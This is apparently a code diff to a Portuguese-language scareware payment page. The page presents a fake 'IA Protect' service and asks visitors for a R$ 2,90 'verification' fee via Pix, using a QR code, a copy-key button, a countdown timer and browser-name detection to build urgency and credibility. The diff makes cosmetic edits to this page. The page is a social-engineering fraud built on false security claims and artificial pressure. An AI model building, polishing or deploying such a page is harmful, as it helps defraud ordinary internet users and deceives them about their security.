@@ -33,7 +33,7 @@
     .copy-btn {
       background-color: #e0e0e0;
       border: none;
-      padding: 10px;
+      padding: 10px 20px;
       margin-top: 10px;
       cursor: pointer;
       border-radius: 6px;
@@ -57,16 +57,13 @@
 
   <p class="info">Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
 
-  <p class="info">
-    <span class="bold">Valor único de verificação: R$ 2,90</span>
-  </p>
-
+  <p class="info"><span class="bold">Valor único de verificação: R$ 2,90</span></p>
   <p style="font-size: 13px;">(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
 
-  <img class="qr" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABVYAAAMACAIAAABAXKuVAACTK0lEQVR4nOzdd7wcVfn48efM1ttvek..." alt="QR Code Pix">
+  <img class="qr" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABVYAAAMACAIAAABAXKuVAACTK0lEQVR4nOzdd7wcVfn48efM1ttvekgIJKSQhJIQegcBUaoUITQBwfDDgiiKX0UgYEFRUURBiiKISuhduvQaSggkISQhJIH05Pa7beb8/lhYly2zs7uzu/fe+bxfeeV1d/bMOc+Und3zzJkZNX+lKQAAAAAAYKAzah0AAAAAAACoBlIAAAAAAAB4AikAAAAAAAA8gRQAAAAAAACeQAoAAAAAAABP8DspVB+UkF" alt="QR Code Pix">
   
   <div>
-    <button class="copy-btn" onclick="copiarPix()">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey</button>
+    <button class="copy-btn" onclick="copiarPix()">Copiar Chave Pix</button>
   </div>
 
   <div class="contador">
@@ -74,16 +71,13 @@
   </div>
 
   <script>
-    // Detectar navegador
     const navegador = navigator.userAgent;
     const browserName = navegador.includes("Firefox") ? "Mozilla Firefox" :
                         navegador.includes("OPR") || navegador.includes("Opera") ? "Opera" :
                         navegador.includes("Chrome") ? "Google Chrome" :
                         "seu navegador";
-
     document.getElementById("browser-name").textContent = browserName;
 
-    // Timer regressivo
     let tempo = 60;
     const timerEl = document.getElementById("timer");
     const intervalo = setInterval(() => {
@@ -92,7 +86,6 @@
       if (tempo <= 0) clearInterval(intervalo);
     }, 1000);
 
-    // Copiar chave Pix
     function copiarPix() {
       const chave = "00020126360014BR.GOV.BCB.PIX0111qrfakepixkey";
       navigator.clipboard.writeText(chave).then(() => {
